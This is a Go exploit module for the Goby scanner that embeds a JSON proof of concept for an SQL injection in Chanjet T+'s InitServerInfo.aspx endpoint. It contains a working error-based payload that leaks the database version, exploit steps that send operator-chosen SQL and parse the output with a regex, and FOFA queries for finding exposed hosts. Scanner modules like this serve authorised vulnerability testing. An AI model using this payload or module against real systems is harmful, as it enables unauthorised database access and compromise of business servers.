package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ChangJieTongT+ /tplus/UFAQD/InitServerInfo.aspx SQL Injection Vulnerability",
    "Description": "<p>Chanjet T+ is a new type of Internet enterprise management system launched by Yonyou Chanjet, which can meet the needs of growing small and micro enterprises for the management and control of their flexible business processes, focusing on solving management problems such as business management, order tracking, capital, and inventory.</p><p>There is an SQL injection vulnerability at the interface of Chanjet T+InitServerInfo.aspx, which may be exploited by malicious attackers to obtain sensitive server information, which may eventually lead to server compromise.</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-04-09",
    "Author": "兰公子",
    "FofaQuery": "body=\"tplus\"",
    "GobyQuery": "body=\"tplus\"",
    "Level": "3",
    "Impact": "<p>There is an SQL injection vulnerability at the interface of Chanjet T+InitServerInfo.aspx, which may be exploited by malicious attackers to obtain sensitive server information, which may eventually lead to server compromise.</p>",
    "Recommendation": "<p>The latest version has been released: <a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/5NIJP-KbT90Nt-uE1JC_gg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlcommon",
            "type": "input",
            "value": "operbtn=create&ServerID=%27%2b(select%0d%0a1%0d%0awhere%0d%0a1%0d%0ain%0d%0a(@@VERSION))%2b%27",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tplus/UFAQD/InitServerInfo.aspx?preload=1",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "operbtn=create&ServerID=%27%2b(select%0d%0a1%0d%0awhere%0d%0a1%0d%0ain%0d%0a(@@VERSION))%2b%27"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/tplus/UFAQD/InitServerInfo.aspx?preload=1"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tplus/UFAQD/InitServerInfo.aspx?preload=1",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{{{sqlcommon}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?:nvarchar 值 ')([\\s\\S]*)(?:')"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "畅捷通T+ /tplus/UFAQD/InitServerInfo.aspx SQL 注入漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>畅捷通T+是用友畅捷通推出的一款新型互联网企业管理系统，T+能够满足成长型小微企业对其灵活业务流程的管控需求，重点解决往来业务管理、订单跟踪、资金、库存等管理难题。</p><p>畅捷通T+InitServerInfo.aspx接口处存在SQL注入漏洞 ，恶意攻击者可能会利用该漏洞获取服务器敏感信息，最终可能导致服务器失陷。</p>",
            "Recommendation": "<p>厂商已发布最新版本：<a href=\"https://www.chanjet.com/\" target=\"_blank\">https://www.chanjet.com/</a><br></p>",
            "Impact": "<p>畅捷通T+InitServerInfo.aspx接口处存在SQL注入漏洞 ，恶意攻击者可能会利用该漏洞获取服务器敏感信息，最终可能导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ChangJieTongT+ /tplus/UFAQD/InitServerInfo.aspx SQL Injection Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Chanjet T+ is a new type of Internet enterprise management system launched by Yonyou Chanjet, which can meet the needs of growing small and micro enterprises for the management and control of their flexible business processes, focusing on solving management problems such as business management, order tracking, capital, and inventory.</p><p>There is an SQL injection vulnerability at the interface of Chanjet T+InitServerInfo.aspx, which may be exploited by malicious attackers to obtain sensitive server information, which may eventually lead to server compromise.</p>",
            "Recommendation": "<p>The latest version has been released: <a href=\"https://www.chanjet.com/\" target=\"_blank\">https://www.chanjet.com/</a><br></p>",
            "Impact": "<p><span>There is an SQL injection vulnerability at the interface of Chanjet T+InitServerInfo.aspx, which may be exploited by malicious attackers to obtain sensitive server information, which may eventually lead to server compromise.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10941"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}